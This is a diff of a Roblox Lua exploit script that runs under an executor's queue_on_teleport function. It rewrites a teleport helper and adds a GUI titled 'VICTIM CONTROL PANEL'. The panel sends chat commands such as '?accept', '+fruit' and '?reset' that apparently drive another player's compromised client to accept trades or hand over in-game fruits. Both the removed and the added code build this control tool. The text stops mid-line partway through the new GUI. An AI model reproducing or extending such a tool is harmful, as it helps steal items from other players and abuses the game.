@@ -1,22 +1,17 @@
+-- MAIN SCRIPT FOR TELEPORT AND COMMAND UI
 local Players = game:GetService("Players")
 local TeleportService = game:GetService("TeleportService")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local CommF = ReplicatedStorage.Remotes.CommF_
-local UserInputService = game:GetService("UserInputService")
 
--- Variables
-local JOBID = ""
-local TARGET_SEA = "2"
+-- Get JOBID from current server
+local JOBID = game.JobId
+local TARGET_SEA = "2" -- Default SEA 2
 
 local SEA_PLACE = {
     ["1"] = 2753915549,
     ["2"] = 4442272183,
     ["3"] = 7449423635,
-}
-
-local FRUITS = {
-    "dragon", "kitsune", "dough", "venom", "leopard", "spirit", "control", "shadow",
-    "quake", "buddha", "rumble", "portal", "phoenix", "gravity", "blizzard", "love"
 }
 
 local function getCurrentSea()
@@ -30,530 +25,16 @@ local function getCurrentSea()
     return "0"
 end
 
--- Command Execution Function
-local function executeCommand(command)
-    local ChatService = ReplicatedStorage:FindFirstChild("DefaultChatSystemChatEvents")
-    
-    if ChatService then
-        local SayMessageRequest = ChatService:FindFirstChild("SayMessageRequest")
-        if SayMessageRequest then
-            SayMessageRequest:FireServer(command, "All")
-            print("Executed command:", command)
-        end
-    else
-        -- Alternative method
-        game:GetService("TextChatService").TextChannels.RBXGeneral:SendAsync(command)
-    end
-end
-
--- Create Teleport GUI (for entering Job ID)
-local function createTeleportGUI()
-    local ScreenGui = Instance.new("ScreenGui")
-    ScreenGui.Name = "TeleportGUI"
-    ScreenGui.Parent = Players.LocalPlayer:WaitForChild("PlayerGui")
-    ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
-    
-    local MainFrame = Instance.new("Frame")
-    MainFrame.Name = "MainFrame"
-    MainFrame.Size = UDim2.new(0, 300, 0, 220)
-    MainFrame.Position = UDim2.new(0.5, -150, 0.5, -110)
-    MainFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 40)
-    MainFrame.BorderSizePixel = 0
-    MainFrame.Active = true
-    MainFrame.Draggable = true
-    MainFrame.Selectable = true
-    MainFrame.Parent = ScreenGui
-    
-    local UICorner = Instance.new("UICorner")
-    UICorner.CornerRadius = UDim.new(0, 10)
-    UICorner.Parent = MainFrame
-    
-    local TopBar = Instance.new("Frame")
-    TopBar.Size = UDim2.new(1, 0, 0, 35)
-    TopBar.BackgroundColor3 = Color3.fromRGB(40, 40, 55)
-    TopBar.Parent = MainFrame
-    
-    local TopCorner = Instance.new("UICorner")
-    TopCorner.CornerRadius = UDim.new(0, 10)
-    TopCorner.Parent = TopBar
-    
-    local Title = Instance.new("TextLabel")
-    Title.Size = UDim2.new(1, -70, 1, 0)
-    Title.Position = UDim2.new(0, 10, 0, 0)
-    Title.BackgroundTransparency = 1
-    Title.Text = "TELEPORT TO SERVER"
-    Title.TextColor3 = Color3.fromRGB(255, 255, 255)
-    Title.Font = Enum.Font.GothamBold
-    Title.TextSize = 14
-    Title.TextXAlignment = Enum.TextXAlignment.Left
-    Title.Parent = TopBar
-    
-    local CloseButton = Instance.new("TextButton")
-    CloseButton.Size = UDim2.new(0, 25, 0, 25)
-    CloseButton.Position = UDim2.new(1, -30, 0.5, -12.5)
-    CloseButton.BackgroundColor3 = Color3.fromRGB(255, 60, 60)
-    CloseButton.Text = "X"
-    CloseButton.TextColor3 = Color3.fromRGB(255, 255, 255)
-    CloseButton.Font = Enum.Font.GothamBold
-    CloseButton.TextSize = 14
-    CloseButton.Parent = TopBar
-    
-    local CloseCorner = Instance.new("UICorner")
-    CloseCorner.CornerRadius = UDim.new(0, 6)
-    CloseCorner.Parent = CloseButton
-    
-    -- Job ID Input
-    local JobIdFrame = Instance.new("Frame")
-    JobIdFrame.Size = UDim2.new(0.85, 0, 0, 35)
-    JobIdFrame.Position = UDim2.new(0.075, 0, 0.3, 0)
-    JobIdFrame.BackgroundColor3 = Color3.fromRGB(45, 45, 60)
-    JobIdFrame.Parent = MainFrame
-    
-    local JobIdCorner = Instance.new("UICorner")
-    JobIdCorner.CornerRadius = UDim.new(0, 6)
-    JobIdCorner.Parent = JobIdFrame
-    
-    local JobIdTextBox = Instance.new("TextBox")
-    JobIdTextBox.Size = UDim2.new(0.9, 0, 0.8, 0)
-    JobIdTextBox.Position = UDim2.new(0.05, 0, 0.1, 0)
-    JobIdTextBox.BackgroundTransparency = 1
-    JobIdTextBox.Text = ""
-    JobIdTextBox.PlaceholderText = "Enter Job ID"
-    JobIdTextBox.PlaceholderColor3 = Color3.fromRGB(150, 150, 150)
-    JobIdTextBox.TextColor3 = Color3.fromRGB(255, 255, 255)
-    JobIdTextBox.Font = Enum.Font.Gotham
-    JobIdTextBox.TextSize = 13
-    JobIdTextBox.Parent = JobIdFrame
-    
-    -- SEA Selection
-    local SeaFrame = Instance.new("Frame")
-    SeaFrame.Size = UDim2.new(0.85, 0, 0, 35)
-    SeaFrame.Position = UDim2.new(0.075, 0, 0.55, 0)
-    SeaFrame.BackgroundColor3 = Color3.fromRGB(45, 45, 60)
-    SeaFrame.Parent = MainFrame
-    
-    local SeaCorner = Instance.new("UICorner")
-    SeaCorner.CornerRadius = UDim.new(0, 6)
-    SeaCorner.Parent = SeaFrame
-    
-    local SeaDropdown = Instance.new("TextButton")
-    SeaDropdown.Size = UDim2.new(0.9, 0, 0.8, 0)
-    SeaDropdown.Position = UDim2.new(0.05, 0, 0.1, 0)
-    SeaDropdown.BackgroundTransparency = 1
-    SeaDropdown.Text = "SEA: 2"
-    SeaDropdown.TextColor3 = Color3.fromRGB(255, 255, 255)
-    SeaDropdown.Font = Enum.Font.Gotham
-    SeaDropdown.TextSize = 13
-    SeaDropdown.Parent = SeaFrame
-    
-    local CurrentSea = "2"
-    
-    SeaDropdown.MouseButton1Click:Connect(function()
-        if CurrentSea == "1" then
-            CurrentSea = "2"
-            SeaDropdown.Text = "SEA: 2"
-        elseif CurrentSea == "2" then
-            CurrentSea = "3"
-            SeaDropdown.Text = "SEA: 3"
-        else
-            CurrentSea = "1"
-            SeaDropdown.Text = "SEA: 1"
-        end
-    end)
-    
-    -- Buttons
-    local ButtonContainer = Instance.new("Frame")
-    ButtonContainer.Size = UDim2.new(0.85, 0, 0, 35)
-    ButtonContainer.Position = UDim2.new(0.075, 0, 0.8, 0)
-    ButtonContainer.BackgroundTransparency = 1
-    ButtonContainer.Parent = MainFrame
-    
-    local TeleportButton = Instance.new("TextButton")
-    TeleportButton.Size = UDim2.new(0.48, 0, 1, 0)
-    TeleportButton.Position = UDim2.new(0, 0, 0, 0)
-    TeleportButton.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
-    TeleportButton.Text = "TELEPORT"
-    TeleportButton.TextColor3 = Color3.fromRGB(255, 255, 255)
-    TeleportButton.Font = Enum.Font.GothamBold
-    TeleportButton.TextSize = 13
-    TeleportButton.Parent = ButtonContainer
-    
-    local TeleportCorner = Instance.new("UICorner")
-    TeleportCorner.CornerRadius = UDim.new(0, 6)
-    TeleportCorner.Parent = TeleportButton
-    
-    local CancelButton = Instance.new("TextButton")
-    CancelButton.Size = UDim2.new(0.48, 0, 1, 0)
-    CancelButton.Position = UDim2.new(0.52, 0, 0, 0)
-    CancelButton.BackgroundColor3 = Color3.fromRGB(255, 60, 60)
-    CancelButton.Text = "CANCEL"
-    CancelButton.TextColor3 = Color3.fromRGB(255, 255, 255)
-    CancelButton.Font = Enum.Font.GothamBold
-    CancelButton.TextSize = 13
-    CancelButton.Parent = ButtonContainer
-    
-    local CancelCorner = Instance.new("UICorner")
-    CancelCorner.CornerRadius = UDim.new(0, 6)
-    CancelCorner.Parent = CancelButton
-    
-    -- Button Functionality
-    CloseButton.MouseButton1Click:Connect(function()
-        ScreenGui:Destroy()
-    end)
-    
-    CancelButton.MouseButton1Click:Connect(function()
-        ScreenGui:Destroy()
-    end)
-    
-    TeleportButton.MouseButton1Click:Connect(function()
-        local jobIdText = JobIdTextBox.Text
-        
-        if not jobIdText or jobIdText == "" then
-            JobIdTextBox.PlaceholderText = "Please enter Job ID!"
-            JobIdTextBox.PlaceholderColor3 = Color3.fromRGB(255, 100, 100)
-            task.wait(1)
-            JobIdTextBox.PlaceholderText = "Enter Job ID"
-            JobIdTextBox.PlaceholderColor3 = Color3.fromRGB(150, 150, 150)
-            return
-        end
-        
-        -- Set variables
-        JOBID = jobIdText
-        TARGET_SEA = CurrentSea
-        
-        -- Close GUI
-        ScreenGui:Destroy()
-        
-        -- Start teleport process
-        teleportToServer()
-    end)
-end
-
--- Create Command GUI (shows after teleport)
-local function createCommandGUI()
-    local ScreenGui = Instance.new("ScreenGui")
-    ScreenGui.Name = "CommandGUI"
-    ScreenGui.Parent = Players.LocalPlayer:WaitForChild("PlayerGui")
-    ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
-    
-    local MainFrame = Instance.new("Frame")
-    MainFrame.Name = "MainFrame"
-    MainFrame.Size = UDim2.new(0, 400, 0, 450)
-    MainFrame.Position = UDim2.new(0.5, -200, 0.5, -225)
-    MainFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 35)
-    MainFrame.BorderSizePixel = 0
-    MainFrame.Active = true
-    MainFrame.Draggable = true
-    MainFrame.Selectable = true
-    MainFrame.Parent = ScreenGui
-    
-    local UICorner = Instance.new("UICorner")
-    UICorner.CornerRadius = UDim.new(0, 12)
-    UICorner.Parent = MainFrame
-    
-    local TopBar = Instance.new("Frame")
-    TopBar.Size = UDim2.new(1, 0, 0, 40)
-    TopBar.BackgroundColor3 = Color3.fromRGB(35, 35, 50)
-    TopBar.Parent = MainFrame
-    
-    local TopCorner = Instance.new("UICorner")
-    TopCorner.CornerRadius = UDim.new(0, 12)
-    TopCorner.Parent = TopBar
-    
-    local Title = Instance.new("TextLabel")
-    Title.Size = UDim2.new(1, -40, 1, 0)
-    Title.Position = UDim2.new(0, 10, 0, 0)
-    Title.BackgroundTransparency = 1
-    Title.Text = "COMMAND CONTROL"
-    Title.TextColor3 = Color3.fromRGB(255, 255, 255)
-    Title.Font = Enum.Font.GothamBold
-    Title.TextSize = 16
-    Title.TextXAlignment = Enum.TextXAlignment.Left
-    Title.Parent = TopBar
-    
-    local CloseButton = Instance.new("TextButton")
-    CloseButton.Size = UDim2.new(0, 25, 0, 25)
-    CloseButton.Position = UDim2.new(1, -30, 0.5, -12.5)
-    CloseButton.BackgroundColor3 = Color3.fromRGB(255, 60, 60)
-    CloseButton.Text = "X"
-    CloseButton.TextColor3 = Color3.fromRGB(255, 255, 255)
-    CloseButton.Font = Enum.Font.GothamBold
-    CloseButton.TextSize = 14
-    CloseButton.Parent = TopBar
-    
-    local CloseCorner = Instance.new("UICorner")
-    CloseCorner.CornerRadius = UDim.new(0, 6)
-    CloseCorner.Parent = CloseButton
-    
-    -- TAB SYSTEM
-    local TabFrame = Instance.new("Frame")
-    TabFrame.Size = UDim2.new(1, -20, 0, 30)
-    TabFrame.Position = UDim2.new(0, 10, 0, 50)
-    TabFrame.BackgroundTransparency = 1
-    TabFrame.Parent = MainFrame
-    
-    local FruitTab = Instance.new("TextButton")
-    FruitTab.Size = UDim2.new(0.33, 0, 1, 0)
-    FruitTab.Position = UDim2.new(0, 0, 0, 0)
-    FruitTab.BackgroundColor3 = Color3.fromRGB(45, 45, 65)
-    FruitTab.Text = "FRUITS"
-    FruitTab.TextColor3 = Color3.fromRGB(255, 255, 255)
-    FruitTab.Font = Enum.Font.GothamBold
-    FruitTab.TextSize = 12
-    FruitTab.Parent = TabFrame
-    
-    local TradeTab = Instance.new("TextButton")
-    TradeTab.Size = UDim2.new(0.33, 0, 1, 0)
-    TradeTab.Position = UDim2.new(0.33, 0, 0, 0)
-    TradeTab.BackgroundColor3 = Color3.fromRGB(35, 35, 50)
-    TradeTab.Text = "TRADE"
-    TradeTab.TextColor3 = Color3.fromRGB(200, 200, 200)
-    TradeTab.Font = Enum.Font.GothamBold
-    TradeTab.TextSize = 12
-    TradeTab.Parent = TabFrame
-    
-    local ControlTab = Instance.new("TextButton")
-    ControlTab.Size = UDim2.new(0.34, 0, 1, 0)
-    ControlTab.Position = UDim2.new(0.66, 0, 0, 0)
-    ControlTab.BackgroundColor3 = Color3.fromRGB(35, 35, 50)
-    ControlTab.Text = "CONTROL"
-    ControlTab.TextColor3 = Color3.fromRGB(200, 200, 200)
-    ControlTab.Font = Enum.Font.GothamBold
-    ControlTab.TextSize = 12
-    ControlTab.Parent = TabFrame
-    
-    local TabCorner = Instance.new("UICorner")
-    TabCorner.CornerRadius = UDim.new(0, 6)
-    TabCorner.Parent = FruitTab
-    TabCorner:Clone().Parent = TradeTab
-    TabCorner:Clone().Parent = ControlTab
-    
-    -- CONTENT FRAME
-    local ContentFrame = Instance.new("Frame")
-    ContentFrame.Size = UDim2.new(1, -20, 1, -100)
-    ContentFrame.Position = UDim2.new(0, 10, 0, 90)
-    ContentFrame.BackgroundTransparency = 1
-    ContentFrame.Parent = MainFrame
-    
-    -- FRUIT COMMANDS TAB
-    local FruitFrame = Instance.new("ScrollingFrame")
-    FruitFrame.Size = UDim2.new(1, 0, 1, 0)
-    FruitFrame.BackgroundTransparency = 1
-    FruitFrame.ScrollBarThickness = 4
-    FruitFrame.AutomaticCanvasSize = Enum.AutomaticSize.Y
-    FruitFrame.Visible = true
-    FruitFrame.Parent = ContentFrame
-    
-    local FruitGrid = Instance.new("UIGridLayout")
-    FruitGrid.CellSize = UDim2.new(0.48, 0, 0, 30)
-    FruitGrid.CellPadding = UDim2.new(0, 3, 0, 3)
-    FruitGrid.StartCorner = Enum.StartCorner.TopLeft
-    FruitGrid.Parent = FruitFrame
-    
-    -- Add Fruit Buttons
-    for _, fruit in pairs(FRUITS) do
-        -- Add Button
-        local AddButton = Instance.new("TextButton")
-        AddButton.Size = UDim2.new(1, 0, 0, 30)
-        AddButton.BackgroundColor3 = Color3.fromRGB(60, 180, 60)
-        AddButton.Text = "+" .. fruit:sub(1, 4):upper()
-        AddButton.TextColor3 = Color3.fromRGB(255, 255, 255)
-        AddButton.Font = Enum.Font.GothamBold
-        AddButton.TextSize = 11
-        AddButton.Parent = FruitFrame
-        
-        local ButtonCorner = Instance.new("UICorner")
-        ButtonCorner.CornerRadius = UDim.new(0, 4)
-        ButtonCorner.Parent = AddButton
-        
-        AddButton.MouseButton1Click:Connect(function()
-            executeCommand("+" .. fruit)
-        end)
-        
-        -- Remove Button
-        local RemoveButton = Instance.new("TextButton")
-        RemoveButton.Size = UDim2.new(1, 0, 0, 30)
-        RemoveButton.BackgroundColor3 = Color3.fromRGB(180, 60, 60)
-        RemoveButton.Text = "-" .. fruit:sub(1, 4):upper()
-        RemoveButton.TextColor3 = Color3.fromRGB(255, 255, 255)
-        RemoveButton.Font = Enum.Font.GothamBold
-        RemoveButton.TextSize = 11
-        RemoveButton.Parent = FruitFrame
-        
-        local RemoveCorner = Instance.new("UICorner")
-        RemoveCorner.CornerRadius = UDim.new(0, 4)
-        RemoveCorner.Parent = RemoveButton
-        
-        RemoveButton.MouseButton1Click:Connect(function()
-            executeCommand("-" .. fruit)
-        end)
-    end
-    
-    -- TRADE COMMANDS TAB
-    local TradeFrame = Instance.new("ScrollingFrame")
-    TradeFrame.Size = UDim2.new(1, 0, 1, 0)
-    TradeFrame.BackgroundTransparency = 1
-    TradeFrame.ScrollBarThickness = 4
-    TradeFrame.AutomaticCanvasSize = Enum.AutomaticSize.Y
-    TradeFrame.Visible = false
-    TradeFrame.Parent = ContentFrame
-    
-    local TradeGrid = Instance.new("UIGridLayout")
-    TradeGrid.CellSize = UDim2.new(1, 0, 0, 35)
-    TradeGrid.CellPadding = UDim2.new(0, 0, 0, 3)
-    TradeGrid.StartCorner = Enum.StartCorner.TopLeft
-    TradeGrid.Parent = TradeFrame
-    
-    local TradeCommands = {
-        {name = "ACCEPT TRADE", command = "?accept", color = Color3.fromRGB(0, 170, 255)}
-    }
-    
-    for _, cmd in pairs(TradeCommands) do
-        local CommandButton = Instance.new("TextButton")
-        CommandButton.Size = UDim2.new(1, 0, 0, 35)
-        CommandButton.BackgroundColor3 = cmd.color
-        CommandButton.Text = cmd.name
-        CommandButton.TextColor3 = Color3.fromRGB(255, 255, 255)
-        CommandButton.Font = Enum.Font.GothamBold
-        CommandButton.TextSize = 14
-        CommandButton.Parent = TradeFrame
-        
-        local CommandCorner = Instance.new("UICorner")
-        CommandCorner.CornerRadius = UDim.new(0, 6)
-        CommandCorner.Parent = CommandButton
-        
-        CommandButton.MouseButton1Click:Connect(function()
-            executeCommand(cmd.command)
-        end)
-    end
-    
-    -- CONTROL COMMANDS TAB
-    local ControlFrame = Instance.new("ScrollingFrame")
-    ControlFrame.Size = UDim2.new(1, 0, 1, 0)
-    ControlFrame.BackgroundTransparency = 1
-    ControlFrame.ScrollBarThickness = 4
-    ControlFrame.AutomaticCanvasSize = Enum.AutomaticSize.Y
-    ControlFrame.Visible = false
-    ControlFrame.Parent = ContentFrame
-    
-    local ControlGrid = Instance.new("UIGridLayout")
-    ControlGrid.CellSize = UDim2.new(1, 0, 0, 35)
-    ControlGrid.CellPadding = UDim2.new(0, 0, 0, 3)
-    ControlGrid.StartCorner = Enum.StartCorner.TopLeft
-    ControlGrid.Parent = ControlFrame
-    
-    local ControlCommands = {
-        {name = "JUMP", command = "?jump", color = Color3.fromRGB(255, 140, 0)},
-        {name = "TELEPORT", command = "?tp", color = Color3.fromRGB(255, 140, 0)},
-        {name = "TEST", command = "?test", color = Color3.fromRGB(255, 140, 0)}
-    }
-    
-    for _, cmd in pairs(ControlCommands) do
-        local CommandButton = Instance.new("TextButton")
-        CommandButton.Size = UDim2.new(1, 0, 0, 35)
-        CommandButton.BackgroundColor3 = cmd.color
-        CommandButton.Text = cmd.name
-        CommandButton.TextColor3 = Color3.fromRGB(255, 255, 255)
-        CommandButton.Font = Enum.Font.GothamBold
-        CommandButton.TextSize = 14
-        CommandButton.Parent = ControlFrame
-        
-        local CommandCorner = Instance.new("UICorner")
-        CommandCorner.CornerRadius = UDim.new(0, 6)
-        CommandCorner.Parent = CommandButton
-        
-        CommandButton.MouseButton1Click:Connect(function()
-            executeCommand(cmd.command)
-        end)
-    end
-    
-    -- RESET FRUIT SECTION
-    local ResetLabel = Instance.new("TextLabel")
-    ResetLabel.Size = UDim2.new(1, 0, 0, 25)
-    ResetLabel.Position = UDim2.new(0, 0, 0, 115)
-    ResetLabel.BackgroundTransparency = 1
-    ResetLabel.Text = "RESET FRUITS:"
-    ResetLabel.TextColor3 = Color3.fromRGB(200, 200, 255)
-    ResetLabel.Font = Enum.Font.GothamBold
-    ResetLabel.TextSize = 12
-    ResetLabel.TextXAlignment = Enum.TextXAlignment.Left
-    ResetLabel.Parent = ControlFrame
-    
-    local ResetGrid = Instance.new("UIGridLayout")
-    ResetGrid.CellSize = UDim2.new(0.49, 0, 0, 28)
-    ResetGrid.CellPadding = UDim2.new(0, 3, 0, 3)
-    ResetGrid.StartCorner = Enum.StartCorner.TopLeft
-    ResetGrid.Parent = ControlFrame
-    
-    local ResetFruits = {"dragon", "kitsune", "dough", "venom", "leopard", "spirit"}
-    
-    for _, fruit in pairs(ResetFruits) do
-        local ResetButton = Instance.new("TextButton")
-        ResetButton.Size = UDim2.new(1, 0, 0, 28)
-        ResetButton.BackgroundColor3 = Color3.fromRGB(255, 100, 100)
-        ResetButton.Text = "RESET " .. fruit:sub(1, 4):upper()
-        ResetButton.TextColor3 = Color3.fromRGB(255, 255, 255)
-        ResetButton.Font = Enum.Font.GothamBold
-        ResetButton.TextSize = 11
-        ResetButton.Parent = ControlFrame
-        
-        local ResetCorner = Instance.new("UICorner")
-        ResetCorner.CornerRadius = UDim.new(0, 4)
-        ResetCorner.Parent = ResetButton
-        
-        ResetButton.MouseButton1Click:Connect(function()
-            executeCommand("?reset " .. fruit)
-        end)
-    end
-    
-    -- TAB SWITCHING
-    local function switchToTab(tabName)
-        FruitTab.BackgroundColor3 = Color3.fromRGB(35, 35, 50)
-        FruitTab.TextColor3 = Color3.fromRGB(200, 200, 200)
-        TradeTab.BackgroundColor3 = Color3.fromRGB(35, 35, 50)
-        TradeTab.TextColor3 = Color3.fromRGB(200, 200, 200)
-        ControlTab.BackgroundColor3 = Color3.fromRGB(35, 35, 50)
-        ControlTab.TextColor3 = Color3.fromRGB(200, 200, 200)
-        
-        FruitFrame.Visible = false
-        TradeFrame.Visible = false
-        ControlFrame.Visible = false
-        
-        if tabName == "fruit" then
-            FruitTab.BackgroundColor3 = Color3.fromRGB(45, 45, 65)
-            FruitTab.TextColor3 = Color3.fromRGB(255, 255, 255)
-            FruitFrame.Visible = true
-        elseif tabName == "trade" then
-            TradeTab.BackgroundColor3 = Color3.fromRGB(45, 45, 65)
-            TradeTab.TextColor3 = Color3.fromRGB(255, 255, 255)
-            TradeFrame.Visible = true
-        elseif tabName == "control" then
-            ControlTab.BackgroundColor3 = Color3.fromRGB(45, 45, 65)
-            ControlTab.TextColor3 = Color3.fromRGB(255, 255, 255)
-            ControlFrame.Visible = true
-        end
-    end
-    
-    FruitTab.MouseButton1Click:Connect(function() switchToTab("fruit") end)
-    TradeTab.MouseButton1Click:Connect(function() switchToTab("trade") end)
-    ControlTab.MouseButton1Click:Connect(function() switchToTab("control") end)
-    
-    -- CLOSE BUTTON
-    CloseButton.MouseButton1Click:Connect(function()
-        ScreenGui:Destroy()
-    end)
-end
-
--- Main teleport function
-local function teleportToServer()
-    local TARGET_PLACE = SEA_PLACE[TARGET_SEA]
-    if not TARGET_PLACE then
-        Players.LocalPlayer:Kick("Invalid SEA config!")
+-- AUTO TELEPORT FUNCTION
+local function autoTeleport()
+    if not JOBID or JOBID == "" then
+        warn("No Job ID found!")
         return
     end
     
-    if not JOBID or JOBID == "" then
-        Players.LocalPlayer:Kick("Invalid or missing JobId!")
+    local TARGET_PLACE = SEA_PLACE[TARGET_SEA]
+    if not TARGET_PLACE then
+        Players.LocalPlayer:Kick("Invalid SEA config!")
         return
     end
     
@@ -562,19 +43,9 @@ local function teleportToServer()
     -- Queue for reconnection
     queue_on_teleport(string.format([[
         task.wait(4)
-        local Players = game:GetService("Players")
-        local ReplicatedStorage = game:GetService("ReplicatedStorage")
-        
         if game.PlaceId == %s and game.JobId ~= "%s" then
             game:GetService("TeleportService"):TeleportToPlaceInstance(%s, "%s")
         end
-        
-        -- Auto-show command GUI after teleport
-        task.wait(3)
-        local function createCommandGUI()
-            -- GUI creation code here (same as above but simplified)
-        end
-        createCommandGUI()
     ]], TARGET_PLACE, JOBID, TARGET_PLACE, JOBID))
     
     -- Handle SEA travel
@@ -594,16 +65,360 @@ local function teleportToServer()
     end
 end
 
--- AUTO EXECUTE
--- First show teleport GUI
-task.wait(2)
-createTeleportGUI()
+-- Command Execution Function
+local function executeCommand(command)
+    local ChatService = ReplicatedStorage:FindFirstChild("DefaultChatSystemChatEvents")
+    
+    if ChatService then
+        local SayMessageRequest = ChatService:FindFirstChild("SayMessageRequest")
+        if SayMessageRequest then
+            SayMessageRequest:FireServer(command, "All")
+            print("Executed command:", command)
+        end
+    else
+        -- Alternative method for new chat
+        local TextChatService = game:GetService("TextChatService")
+        if TextChatService then
+            pcall(function()
+                TextChatService.TextChannels.RBXGeneral:SendAsync(command)
+            end)
+        end
+    end
+end
 
--- Auto-show command GUI if already in a server
+-- CREATE COMMAND UI (Will show after teleport)
+local function createCommandGUI()
+    local ScreenGui = Instance.new("ScreenGui")
+    ScreenGui.Name = "CommandGUI"
+    ScreenGui.Parent = Players.LocalPlayer:WaitForChild("PlayerGui")
+    ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+    
+    local MainFrame = Instance.new("Frame")
+    MainFrame.Name = "MainFrame"
+    MainFrame.Size = UDim2.new(0, 380, 0, 350)
+    MainFrame.Position = UDim2.new(0.5, -190, 0.5, -175)
+    MainFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 35)
+    MainFrame.BorderSizePixel = 0
+    MainFrame.Active = true
+    MainFrame.Draggable = true
+    MainFrame.Selectable = true
+    MainFrame.Parent = ScreenGui
+    
+    local UICorner = Instance.new("UICorner")
+    UICorner.CornerRadius = UDim.new(0, 12)
+    UICorner.Parent = MainFrame
+    
+    local TopBar = Instance.new("Frame")
+    TopBar.Size = UDim2.new(1, 0, 0, 35)
+    TopBar.BackgroundColor3 = Color3.fromRGB(35, 35, 50)
+    TopBar.Parent = MainFrame
+    
+    local TopCorner = Instance.new("UICorner")
+    TopCorner.CornerRadius = UDim.new(0, 12)
+    TopCorner.Parent = TopBar
+    
+    local Title = Instance.new("TextLabel")
+    Title.Size = UDim2.new(1, -40, 1, 0)
+    Title.Position = UDim2.new(0, 10, 0, 0)
+    Title.BackgroundTransparency = 1
+    Title.Text = "VICTIM CONTROL PANEL"
+    Title.TextColor3 = Color3.fromRGB(255, 255, 255)
+    Title.Font = Enum.Font.GothamBold
+    Title.TextSize = 14
+    Title.TextXAlignment = Enum.TextXAlignment.Left
+    Title.Parent = TopBar
+    
+    local CloseButton = Instance.new("TextButton")
+    CloseButton.Size = UDim2.new(0, 25, 0, 25)
+    CloseButton.Position = UDim2.new(1, -30, 0.5, -12.5)
+    CloseButton.BackgroundColor3 = Color3.fromRGB(255, 60, 60)
+    CloseButton.Text = "X"
+    CloseButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+    CloseButton.Font = Enum.Font.GothamBold
+    CloseButton.TextSize = 12
+    CloseButton.Parent = TopBar
+    
+    local CloseCorner = Instance.new("UICorner")
+    CloseCorner.CornerRadius = UDim.new(0, 6)
+    CloseCorner.Parent = CloseButton
+    
+    -- FRUIT INPUT SECTION
+    local FruitFrame = Instance.new("Frame")
+    FruitFrame.Size = UDim2.new(1, -20, 0, 100)
+    FruitFrame.Position = UDim2.new(0, 10, 0, 45)
+    FruitFrame.BackgroundColor3 = Color3.fromRGB(40, 40, 55)
+    FruitFrame.Parent = MainFrame
+    
+    local FruitCorner = Instance.new("UICorner")
+    FruitCorner.CornerRadius = UDim.new(0, 8)
+    FruitCorner.Parent = FruitFrame
+    
+    local FruitLabel = Instance.new("TextLabel")
+    FruitLabel.Size = UDim2.new(1, 0, 0, 25)
+    FruitLabel.Position = UDim2.new(0, 0, 0, 0)
+    FruitLabel.BackgroundTransparency = 1
+    FruitLabel.Text = "FRUIT COMMANDS"
+    FruitLabel.TextColor3 = Color3.fromRGB(200, 200, 255)
+    FruitLabel.Font = Enum.Font.GothamBold
+    FruitLabel.TextSize = 12
+    FruitLabel.Parent = FruitFrame
+    
+    local FruitInput = Instance.new("TextBox")
+    FruitInput.Size = UDim2.new(0.65, 0, 0, 30)
+    FruitInput.Position = UDim2.new(0.02, 0, 0.35, 0)
+    FruitInput.BackgroundColor3 = Color3.fromRGB(50, 50, 70)
+    FruitInput.Text = ""
+    FruitInput.PlaceholderText = "Enter fruit name"
+    FruitInput.PlaceholderColor3 = Color3.fromRGB(150, 150, 150)
+    FruitInput.TextColor3 = Color3.fromRGB(255, 255, 255)
+    FruitInput.Font = Enum.Font.Gotham
+    FruitInput.TextSize = 12
+    FruitInput.Parent = FruitFrame
+    
+    local InputCorner = Instance.new("UICorner")
+    InputCorner.CornerRadius = UDim.new(0, 6)
+    InputCorner.Parent = FruitInput
+    
+    local AddButton = Instance.new("TextButton")
+    AddButton.Size = UDim2.new(0.3, 0, 0, 30)
+    AddButton.Position = UDim2.new(0.68, 0, 0.35, 0)
+    AddButton.BackgroundColor3 = Color3.fromRGB(60, 180, 60)
+    AddButton.Text = "ADD"
+    AddButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+    AddButton.Font = Enum.Font.GothamBold
+    AddButton.TextSize = 12
+    AddButton.Parent = FruitFrame
+    
+    local AddCorner = Instance.new("UICorner")
+    AddCorner.CornerRadius = UDim.new(0, 6)
+    AddCorner.Parent = AddButton
+    
+    local RemoveButton = Instance.new("TextButton")
+    RemoveButton.Size = UDim2.new(0.3, 0, 0, 30)
+    RemoveButton.Position = UDim2.new(0.68, 0, 0.65, 0)
+    RemoveButton.BackgroundColor3 = Color3.fromRGB(180, 60, 60)
+    RemoveButton.Text = "REMOVE"
+    RemoveButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+    RemoveButton.Font = Enum.Font.GothamBold
+    RemoveButton.TextSize = 12
+    RemoveButton.Parent = FruitFrame
+    
+    local RemoveCorner = Instance.new("UICorner")
+    RemoveCorner.CornerRadius = UDim.new(0, 6)
+    RemoveCorner.Parent = RemoveButton
+    
+    -- TRADE COMMANDS SECTION
+    local TradeFrame = Instance.new("Frame")
+    TradeFrame.Size = UDim2.new(1, -20, 0, 80)
+    TradeFrame.Position = UDim2.new(0, 10, 0, 155)
+    TradeFrame.BackgroundColor3 = Color3.fromRGB(40, 40, 55)
+    TradeFrame.Parent = MainFrame
+    
+    local TradeCorner = Instance.new("UICorner")
+    TradeCorner.CornerRadius = UDim.new(0, 8)
+    TradeCorner.Parent = TradeFrame
+    
+    local TradeLabel = Instance.new("TextLabel")
+    TradeLabel.Size = UDim2.new(1, 0, 0, 25)
+    TradeLabel.Position = UDim2.new(0, 0, 0, 0)
+    TradeLabel.BackgroundTransparency = 1
+    TradeLabel.Text = "TRADE COMMANDS"
+    TradeLabel.TextColor3 = Color3.fromRGB(200, 200, 255)
+    TradeLabel.Font = Enum.Font.GothamBold
+    TradeLabel.TextSize = 12
+    TradeLabel.Parent = TradeFrame
+    
+    local AcceptButton = Instance.new("TextButton")
+    AcceptButton.Size = UDim2.new(0.96, 0, 0, 35)
+    AcceptButton.Position = UDim2.new(0.02, 0, 0.35, 0)
+    AcceptButton.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
+    AcceptButton.Text = "ACCEPT TRADE"
+    AcceptButton.TextColor3 = Color3.fromRGB(255, 255, 255)
